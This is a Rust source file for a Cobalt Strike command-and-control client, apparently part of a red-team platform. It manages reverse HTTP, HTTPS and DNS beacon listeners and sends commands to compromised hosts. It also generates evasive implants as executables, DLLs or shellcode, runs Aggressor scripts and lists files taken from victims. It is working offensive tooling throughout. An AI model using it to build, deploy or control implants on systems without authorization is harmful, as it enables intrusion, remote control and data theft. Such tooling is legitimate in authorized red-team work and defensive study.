//! Cobalt Strike C2 Framework Integration
//!
//! Client for interacting with Cobalt Strike team server via the External C2 specification.
//! This implements the External C2 protocol for authorized red team operations.
//!
//! References:
//! - https://www.cobaltstrike.com/help-externalc2
//! - External C2 specification for third-party C2 channel development

#![allow(dead_code)]

use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use super::types::*;

/// Cobalt Strike team server client
pub struct CobaltStrikeClient {
    config: C2Config,
    http_client: Client,
    connected: Arc<RwLock<bool>>,
    /// External C2 socket connection (if using socket-based External C2)
    socket: Arc<RwLock<Option<TcpStream>>>,
}

/// External C2 frame types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum ExternalC2FrameType {
    /// Beacon metadata frame
    BeaconMetadata = 0,
    /// Beacon data frame
    BeaconData = 1,
    /// Beacon output frame
    BeaconOutput = 2,
    /// Beacon error frame
    BeaconError = 3,
    /// Close/exit frame
    Close = 4,
}

/// External C2 frame for communication
#[derive(Debug, Clone)]
pub struct ExternalC2Frame {
    pub frame_type: ExternalC2FrameType,
    pub data: Vec<u8>,
}

impl ExternalC2Frame {
    /// Create a new frame
    pub fn new(frame_type: ExternalC2FrameType, data: Vec<u8>) -> Self {
        Self { frame_type, data }
    }

    /// Serialize frame to bytes (4-byte length + 4-byte type + data)
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(8 + self.data.len());
        // Length (little-endian)
        bytes.extend_from_slice(&((4 + self.data.len()) as u32).to_le_bytes());
        // Frame type (little-endian)
        bytes.extend_from_slice(&(self.frame_type as u32).to_le_bytes());
        // Data
        bytes.extend_from_slice(&self.data);
        bytes
    }

    /// Parse frame from bytes
    pub fn from_bytes(bytes: &[u8]) -> Result<Self> {
        if bytes.len() < 8 {
            return Err(anyhow!("Frame too short"));
        }

        let _length = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]) as usize;
        let frame_type_raw = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);

        let frame_type = match frame_type_raw {
            0 => ExternalC2FrameType::BeaconMetadata,
            1 => ExternalC2FrameType::BeaconData,
            2 => ExternalC2FrameType::BeaconOutput,
            3 => ExternalC2FrameType::BeaconError,
            4 => ExternalC2FrameType::Close,
            _ => return Err(anyhow!("Unknown frame type: {}", frame_type_raw)),
        };

        let data = if bytes.len() > 8 {
            bytes[8..].to_vec()
        } else {
            Vec::new()
        };

        Ok(Self { frame_type, data })
    }
}

// Cobalt Strike REST API response types (for team server with REST API enabled)
#[derive(Debug, Deserialize)]
struct CsBeacon {
    id: String,
    user: String,
    computer: String,
    host: String,
    process: String,
    pid: i32,
    arch: String,
    os: String,
    ver: String,
    last: i64,
    pbid: String,
    note: Option<String>,
    internal: String,
    external: Option<String>,
}

#[derive(Debug, Deserialize)]
struct CsListener {
    name: String,
    payload: String,
    host: String,
    port: i32,
    bindto: Option<i32>,
}

#[derive(Debug, Deserialize)]
struct CsDownload {
    id: i32,
    bid: String,
    name: String,
    path: String,
    size: i64,
    date: String,
}

#[derive(Debug, Serialize)]
struct CsTaskRequest {
    bid: String,
    command: String,
}

#[derive(Debug, Deserialize)]
struct CsTaskResponse {
    task_id: String,
    #[serde(default)]
    output: Option<String>,
}

/// Aggressor script hook types
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AggressorHook {
    /// Called when a new beacon connects
    BeaconInitial,
    /// Called periodically for each beacon
    BeaconCheckin,
    /// Called when beacon output is received
    BeaconOutput,
    /// Called when a beacon dies
    BeaconDead,
    /// Custom event hook
    Custom(String),
}

/// Aggressor script command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AggressorCommand {
    pub command: String,
    pub args: Vec<String>,
    pub beacon_id: Option<String>,
}

impl CobaltStrikeClient {
    /// Create a new Cobalt Strike client
    pub fn new(config: C2Config) -> Result<Self> {
        let http_client = Client::builder()
            .danger_accept_invalid_certs(!config.verify_ssl)
            .build()?;

        Ok(Self {
            config,
            http_client,
            connected: Arc::new(RwLock::new(false)),
            socket: Arc::new(RwLock::new(None)),
        })
    }

    /// Get base URL for team server REST API
    fn base_url(&self) -> String {
        format!("https://{}:{}", self.config.host, self.config.port)
    }

    /// Get authorization header
    fn auth_header(&self) -> String {
        format!("Bearer {}", self.config.api_token.as_deref().unwrap_or(""))
    }

    /// Test connection to team server
    pub async fn test_connection(&self) -> Result<bool> {
        // Try REST API endpoint first
        let url = format!("{}/api/beacons", self.base_url());

        match self.http_client
            .get(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await
        {
            Ok(resp) => {
                let connected = resp.status().is_success();
                *self.connected.write().await = connected;
                Ok(connected)
            }
            Err(_) => {
                // Try External C2 socket connection
                self.connect_external_c2().await
            }
        }
    }

    /// Connect via External C2 socket
    async fn connect_external_c2(&self) -> Result<bool> {
        let addr = format!("{}:{}", self.config.host, self.config.port);

        match TcpStream::connect(&addr).await {
            Ok(stream) => {
                *self.socket.write().await = Some(stream);
                *self.connected.write().await = true;
                Ok(true)
            }
            Err(e) => {
                *self.connected.write().await = false;
                Err(anyhow!("Failed to connect to Cobalt Strike External C2: {}", e))
            }
        }
    }

    /// Check if connected
    pub async fn is_connected(&self) -> bool {
        *self.connected.read().await
    }

    /// Send External C2 frame
    async fn send_frame(&self, frame: &ExternalC2Frame) -> Result<()> {
        let mut socket_guard = self.socket.write().await;
        if let Some(ref mut socket) = *socket_guard {
            socket.write_all(&frame.to_bytes()).await?;
            Ok(())
        } else {
            Err(anyhow!("Not connected via External C2"))
        }
    }

    /// Receive External C2 frame
    async fn recv_frame(&self) -> Result<ExternalC2Frame> {
        let mut socket_guard = self.socket.write().await;
        if let Some(ref mut socket) = *socket_guard {
            // Read length (4 bytes)
            let mut len_buf = [0u8; 4];
            socket.read_exact(&mut len_buf).await?;
            let length = u32::from_le_bytes(len_buf) as usize;

            // Read remaining frame
            let mut data = vec![0u8; length];
            socket.read_exact(&mut data).await?;

            // Reconstruct full frame
            let mut full_frame = Vec::with_capacity(4 + length);
            full_frame.extend_from_slice(&len_buf);
            full_frame.extend_from_slice(&data);

            ExternalC2Frame::from_bytes(&full_frame)
        } else {
            Err(anyhow!("Not connected via External C2"))
        }
    }

    /// List all beacons via REST API
    pub async fn list_beacons(&self) -> Result<Vec<Session>> {
        let url = format!("{}/api/beacons", self.base_url());

        let resp = self.http_client
            .get(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to list beacons: {}", resp.status()));
        }

        let beacons: Vec<CsBeacon> = resp.json().await.unwrap_or_default();
        Ok(beacons.into_iter().map(|b| self.convert_beacon(b)).collect())
    }

    /// List all listeners
    pub async fn list_listeners(&self) -> Result<Vec<Listener>> {
        let url = format!("{}/api/listeners", self.base_url());

        let resp = self.http_client
            .get(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to list listeners: {}", resp.status()));
        }

        let listeners: Vec<CsListener> = resp.json().await.unwrap_or_default();
        Ok(listeners.into_iter().map(|l| self.convert_listener(l)).collect())
    }

    /// Start a new listener
    pub async fn start_listener(&self, req: &CreateListenerRequest) -> Result<Listener> {
        let url = format!("{}/api/listeners", self.base_url());

        let payload = match req.protocol {
            ListenerProtocol::Http => "windows/beacon_http/reverse_http",
            ListenerProtocol::Https => "windows/beacon_https/reverse_https",
            ListenerProtocol::Dns => "windows/beacon_dns/reverse_dns_txt",
            ListenerProtocol::Tcp => "windows/beacon_bind_tcp",
            _ => "windows/beacon_https/reverse_https",
        };

        let body = serde_json::json!({
            "name": req.name,
            "payload": payload,
            "host": req.host,
            "port": req.port,
        });

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .json(&body)
            .send()
            .await?;

        if !resp.status().is_success() {
            let error_text = resp.text().await.unwrap_or_default();
            return Err(anyhow!("Failed to start listener: {}", error_text));
        }

        Ok(Listener {
            id: uuid::Uuid::new_v4().to_string(),
            c2_config_id: self.config.id.clone(),
            name: req.name.clone(),
            protocol: req.protocol.clone(),
            host: req.host.clone(),
            port: req.port,
            status: ListenerStatus::Active,
            domains: req.domains.clone().unwrap_or_default(),
            website: req.website.clone(),
            config: req.config.clone().unwrap_or_default(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        })
    }

    /// Stop a listener
    pub async fn stop_listener(&self, listener_name: &str) -> Result<()> {
        let url = format!("{}/api/listeners/{}", self.base_url(), listener_name);

        let resp = self.http_client
            .delete(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to stop listener: {}", resp.status()));
        }

        Ok(())
    }

    /// Execute a command on a beacon
    pub async fn execute_task(&self, beacon_id: &str, task: &ExecuteTaskRequest) -> Result<Task> {
        let url = format!("{}/api/beacons/{}/task", self.base_url(), beacon_id);

        // Build command string with args
        let command = if let Some(args) = &task.args {
            if args.is_empty() {
                task.command.clone()
            } else {
                format!("{} {}", task.command, args.join(" "))
            }
        } else {
            task.command.clone()
        };

        let body = serde_json::json!({
            "command": command,
        });

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .json(&body)
            .send()
            .await?;

        if !resp.status().is_success() {
            let error_text = resp.text().await.unwrap_or_default();
            return Err(anyhow!("Failed to execute task: {}", error_text));
        }

        let result: CsTaskResponse = resp.json().await?;

        Ok(Task {
            id: uuid::Uuid::new_v4().to_string(),
            session_id: beacon_id.to_string(),
            c2_task_id: Some(result.task_id),
            task_type: task.task_type.clone(),
            command: task.command.clone(),
            args: task.args.clone().unwrap_or_default(),
            status: TaskStatus::Sent,
            output: result.output,
            error: None,
            created_at: Utc::now(),
            sent_at: Some(Utc::now()),
            completed_at: None,
        })
    }

    /// Kill a beacon
    pub async fn kill_beacon(&self, beacon_id: &str) -> Result<()> {
        let url = format!("{}/api/beacons/{}/kill", self.base_url(), beacon_id);

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to kill beacon: {}", resp.status()));
        }

        Ok(())
    }

    /// Generate a payload/implant (stageless beacon)
    pub async fn generate_implant(&self, config: &ImplantConfig) -> Result<Vec<u8>> {
        let url = format!("{}/api/generate", self.base_url());

        let (os, arch_str) = match (&config.platform, &config.arch) {
            (Platform::Windows, Architecture::X64) => ("windows", "x64"),
            (Platform::Windows, Architecture::X86) => ("windows", "x86"),
            (Platform::Linux, Architecture::X64) => ("linux", "x64"),
            (Platform::Linux, Architecture::X86) => ("linux", "x86"),
            (Platform::MacOS, Architecture::X64) => ("macos", "x64"),
            (Platform::MacOS, Architecture::Arm64) => ("macos", "arm64"),
            _ => return Err(anyhow!("Unsupported platform/architecture combination")),
        };

        let format = match config.format {
            ImplantFormat::Exe => "exe",
            ImplantFormat::Dll => "dll",
            ImplantFormat::Shellcode => "raw",
            ImplantFormat::ServiceExe => "svc_exe",
            _ => "exe",
        };

        let body = serde_json::json!({
            "listener": config.listener_id,
            "os": os,
            "arch": arch_str,
            "format": format,
            "syscalls": config.evasion,
        });

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .json(&body)
            .send()
            .await?;

        if !resp.status().is_success() {
            let error_text = resp.text().await.unwrap_or_default();
            return Err(anyhow!("Failed to generate implant: {}", error_text));
        }

        Ok(resp.bytes().await?.to_vec())
    }

    /// Execute Aggressor script command
    pub async fn execute_aggressor(&self, cmd: &AggressorCommand) -> Result<String> {
        let url = format!("{}/api/aggressor", self.base_url());

        let body = serde_json::json!({
            "command": cmd.command,
            "args": cmd.args,
            "bid": cmd.beacon_id,
        });

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .json(&body)
            .send()
            .await?;

        if !resp.status().is_success() {
            let error_text = resp.text().await.unwrap_or_default();
            return Err(anyhow!("Failed to execute Aggressor command: {}", error_text));
        }

        Ok(resp.text().await?)
    }

    /// Register a hook for Aggressor events
    pub async fn register_hook(&self, hook: AggressorHook, callback_url: &str) -> Result<()> {
        let url = format!("{}/api/hooks", self.base_url());

        let hook_name = match &hook {
            AggressorHook::BeaconInitial => "beacon_initial",
            AggressorHook::BeaconCheckin => "beacon_checkin",
            AggressorHook::BeaconOutput => "beacon_output",
            AggressorHook::BeaconDead => "beacon_dead",
            AggressorHook::Custom(name) => name.as_str(),
        };

        let body = serde_json::json!({
            "hook": hook_name,
            "callback": callback_url,
        });

        let resp = self.http_client
            .post(&url)
            .header("Authorization", self.auth_header())
            .json(&body)
            .send()
            .await?;

        if !resp.status().is_success() {
            let error_text = resp.text().await.unwrap_or_default();
            return Err(anyhow!("Failed to register hook: {}", error_text));
        }

        Ok(())
    }

    /// Get beacon output/console
    pub async fn get_beacon_output(&self, beacon_id: &str) -> Result<String> {
        let url = format!("{}/api/beacons/{}/output", self.base_url(), beacon_id);

        let resp = self.http_client
            .get(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to get beacon output: {}", resp.status()));
        }

        Ok(resp.text().await?)
    }

    /// List downloaded files
    pub async fn list_downloads(&self, beacon_id: Option<&str>) -> Result<Vec<DownloadedFile>> {
        let url = if let Some(bid) = beacon_id {
            format!("{}/api/downloads?bid={}", self.base_url(), bid)
        } else {
            format!("{}/api/downloads", self.base_url())
        };

        let resp = self.http_client
            .get(&url)
            .header("Authorization", self.auth_header())
            .send()
            .await?;

        if !resp.status().is_success() {
            return Err(anyhow!("Failed to list downloads: {}", resp.status()));
        }

        let downloads: Vec<CsDownload> = resp.json().await.unwrap_or_default();

        Ok(downloads.into_iter().map(|d| DownloadedFile {
            id: d.id.to_string(),
            session_id: d.bid,
            remote_path: d.path,
            local_path: format!("./downloads/{}", d.name),
            file_name: d.name,
            file_size: d.size as u64,
            file_hash: String::new(),
            downloaded_at: Utc::now(),
        }).collect())
    }

    // Helper to convert CS beacon to our Session type
    fn convert_beacon(&self, b: CsBeacon) -> Session {
        let arch = if b.arch.contains("64") {
            Architecture::X64
        } else if b.arch.contains("arm") {
            Architecture::Arm64
        } else {
            Architecture::X86
        };

        let last_checkin = DateTime::from_timestamp(b.last, 0)
            .unwrap_or_else(|| Utc::now());

        Session {
            id: uuid::Uuid::new_v4().to_string(),
            c2_config_id: self.config.id.clone(),
            c2_session_id: b.id.clone(),
            implant_id: None,
            name: b.computer.clone(),
            hostname: b.computer,
            username: b.user,
            domain: None,
            ip_address: b.internal,
            external_ip: b.external,
            os: b.os,
            os_version: Some(b.ver),
            arch,
            pid: b.pid as u32,
            process_name: b.process,
            integrity: None,
            status: SessionStatus::Active,
            is_elevated: false,
            locale: None,
            first_seen: Utc::now(),
            last_checkin,
            next_checkin: None,
            notes: b.note,
        }
    }

    // Helper to convert CS listener to our Listener type
    fn convert_listener(&self, l: CsListener) -> Listener {
        let protocol = if l.payload.contains("dns") {
            ListenerProtocol::Dns
        } else if l.payload.contains("https") {
            ListenerProtocol::Https
        } else if l.payload.contains("http") {
            ListenerProtocol::Http
        } else if l.payload.contains("tcp") {
            ListenerProtocol::Tcp
        } else {
            ListenerProtocol::Https
        };

        Listener {
            id: l.name.clone(),
            c2_config_id: self.config.id.clone(),
            name: l.name,
            protocol,
            host: l.host,
            port: l.port as u16,
            status: ListenerStatus::Active,
            domains: Vec::new(),
            website: None,
            config: HashMap::new(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_frame_serialization() {
        let frame = ExternalC2Frame::new(
            ExternalC2FrameType::BeaconData,
            vec![0x41, 0x42, 0x43],
        );
        let bytes = frame.to_bytes();

        // Length should be 4 (type) + 3 (data) = 7
        assert_eq!(bytes[0..4], [7, 0, 0, 0]);
        // Type should be 1 (BeaconData)
        assert_eq!(bytes[4..8], [1, 0, 0, 0]);
        // Data should be ABC
        assert_eq!(&bytes[8..], &[0x41, 0x42, 0x43]);
    }

    #[test]
    fn test_frame_parsing() {
        let bytes = vec![
            7, 0, 0, 0,     // Length: 7
            2, 0, 0, 0,     // Type: BeaconOutput
            0x48, 0x49,     // Data: "HI"
        ];

        let frame = ExternalC2Frame::from_bytes(&bytes).unwrap();
        assert_eq!(frame.frame_type, ExternalC2FrameType::BeaconOutput);
        assert_eq!(frame.data, vec![0x48, 0x49]);
    }
}
